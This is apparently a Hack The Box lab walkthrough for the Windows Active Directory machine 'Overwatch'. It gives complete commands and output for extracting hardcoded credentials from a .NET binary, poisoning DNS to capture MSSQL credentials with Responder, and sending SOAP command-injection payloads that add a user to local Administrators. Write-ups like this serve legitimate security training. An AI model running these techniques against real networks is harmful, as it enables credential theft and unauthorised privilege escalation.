---
layout: post
title: "[HTB] Overwatch"
description: "Overwatch is a Medium Windows AD machine where a guest-accessible SMB share exposes a .NET binary. Decompiling it reveals hardcoded MSSQL credentials and a linked server SQL07. Poisoning DNS to point SQL07 at the attacker machine intercepts cleartext MSSQL credentials via Responder, enabling WinRM access. A locally running WCF service's KillProcess endpoint is vulnerable to command injection, used to add the current user to local Administrators and read the root flag."
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Medium
---
![](/img/htb_img/Overwatch_img/img1.png)

- OS: Windows
- Release Date: 24 Jan 2026
- Difficulty: Medium

# Enumeration
## Nmap auto-recon
```bash
❯ autorecon $target

[*] Stage 1: Fast stealth scan on all TCP ports for 10.129.xx.xx...
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-05 09:22 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.043s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
6520/tcp  open  unknown
9389/tcp  open  adws
49664/tcp open  unknown
49669/tcp open  unknown
59169/tcp open  unknown
59170/tcp open  unknown
61941/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 52.81 seconds

[+] Open TCP ports: 53,88,135,139,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49669,59169,59170,61941
[*] Stage 2: Service/script scan (sCV) on discovered ports...

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-05 09:22 CET
Nmap scan report for 10.129.xx.xx
Host is up (0.045s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-05 08:22:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-03-05T08:24:27+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
| rdp-ntlm-info:
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-05T08:23:47+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6520/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-03-05T08:23:49
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.98 seconds
```

## SMB Enumeration
Listing SMB Shares with the guest account:
```bash
❯ smbclient -L //10.129.xx.xx -U guest%

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
software$       Disk
SYSVOL          Disk      Logon server share
```

An interesting share was found: `software$`.

### Checking the software$ share
```bash
❯ smbclient //10.129.xx.xx/software$ -U guest%
smb: \Monitoring\> ls
.                                  DH        0  Sat May 17 03:32:43 2025
..                                 DH        0  Sat May 17 03:27:07 2025
EntityFramework.dll                AH  4991352  Thu Apr 16 22:38:42 2020
EntityFramework.SqlServer.dll      AH   591752  Thu Apr 16 22:38:56 2020
overwatch.exe                      AH     9728  Sat May 17 03:19:24 2025
overwatch.exe.config               AH     2163  Sat May 17 03:02:30 2025
overwatch.pdb                      AH    30208  Sat May 17 03:19:24 2025
System.Data.SQLite.dll             AH   450232  Sun Sep 29 22:41:18 2024
```

Three files caught my attention:
```bash
overwatch.exe
overwatch.exe.config
overwatch.pdb
```

# Foothold
## Binary analysis
```bash
❯ file overwatch.exe
overwatch.exe: PE32+ executable for MS Windows 6.00 (console), x86-64 Mono/.Net assembly, 2 sections

❯ strings overwatch.exe | grep NET
.NETFramework,Version=v4.7.2
.NET Framework 4.7.2
```

Seems to be a .NET binary.

### Config file analysis
```bash
❯ cat overwatch.exe.config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <system.serviceModel>
    <services>
      <service name="MonitoringService">
        <host>
          <baseAddresses>
            <add baseAddress="http://overwatch.htb:8000/MonitorService" />
          </baseAddresses>
        </host>
        <endpoint address="" binding="basicHttpBinding" contract="IMonitoringService" />
        <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" />
      </service>
    </services>
  </system.serviceModel>
</configuration>
```
- WCF endpoint: `http://overwatch.htb:8000/MonitorService`
- Service name: `MonitoringService`
- Interface: `IMonitoringService`

## dnSpy
Let's load the `.exe` binary with `dnSpy`. We need to run `dnSpy` within a Windows VM:
![](/img/htb_img/Overwatch_img/img2.png)

To extract hard-coded credentials we can use `monodis`:
```bash
❯ monodis overwatch.exe > data_overwatch.txt

❯ cat data_overwatch.txt | grep Password
IL_0001:  ldstr "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"
```

`sqlsvc:TI0LKcfHzZw1Vv`

## MSSQL connection
```bash
$ mssqlclient.py 'overwatch/sqlsvc:TI0LKcfHzZw1Vv@10.129.xx.xx' -port 6520 -windows-auth
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)>
```

Enumerating Linked Servers:
```bash
SQL (OVERWATCH\sqlsvc  guest@master)> EXEC sp_linkedservers;
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL
```

There is a linked server named `SQL07` which is interesting to look at.

### Capturing creds
If NTLM is used for authentication to the linked server, we can intercept the hash. Starting responder:
```bash
sudo responder -I tun0
```

DNS poisoning to redirect SQL07 to our machine:
```bash
❯ python3 ~/krbrelayx/dnstool.py $target -u OVERWATCH\\sqlsvc -p 'TI0LKcfHzZw1Vv' --action add --record SQL07.overwatch.htb --data 10.10.xx.xx
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Triggering authentication:
```bash
Select * From OPENQUERY([SQL07], 'SELECT @@version');
```

In responder we got the credentials:
```bash
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```
`sqlmgmt:bIhBbzMMnB82yx`

## Shell as sqlmgmt
```bash
❯ evil-winrm -i $target -u sqlmgmt -p bIhBbzMMnB82yx

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> 
```

### User flag
```bash
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> type user.txt
<REDACTED>
```

# Privilege Escalation
After looking around for a bit, I discovered port 8000 is listening locally — this belongs to the WCF endpoint we found in the config file.

The `KillProcess` function seems vulnerable to command injection because it concatenates user input.

## Command Injection
We can craft a SOAP request to exploit the vulnerability:
```powershell
$body = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<KillProcess xmlns="http://tempuri.org/">
<processName>notepad.exe &amp; whoami</processName>
</KillProcess>
</soap:Body>
</soap:Envelope>
"@

Invoke-WebRequest -Uri "http://localhost:8000/MonitorService" `
-Method POST `
-Body $body `
-ContentType "text/xml; charset=utf-8" `
-Headers @{"SOAPAction"="http://tempuri.org/IMonitoringService/KillProcess"} `
-UseBasicParsing
```

We can add `sqlmgmt` to local Administrators:
```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> $body = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<KillProcess xmlns="http://tempuri.org/">
<processName>notepad -Force; net localgroup administrators sqlmgmt /add</processName>
</KillProcess>
</soap:Body>
</soap:Envelope>
"@

Invoke-WebRequest -Uri "http://localhost:8000/MonitorService" `
-Method POST `
-Body $body `
-ContentType "text/xml; charset=utf-8" `
-Headers @{"SOAPAction"="http://tempuri.org/IMonitoringService/KillProcess"} `
-UseBasicParsing

*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> net localgroup administrators
Alias name     administrators

Members
-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
sqlmgmt
The command completed successfully.
```

We re-login and we should be able to read both flags now.

### Root flag
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<REDACTED>
```
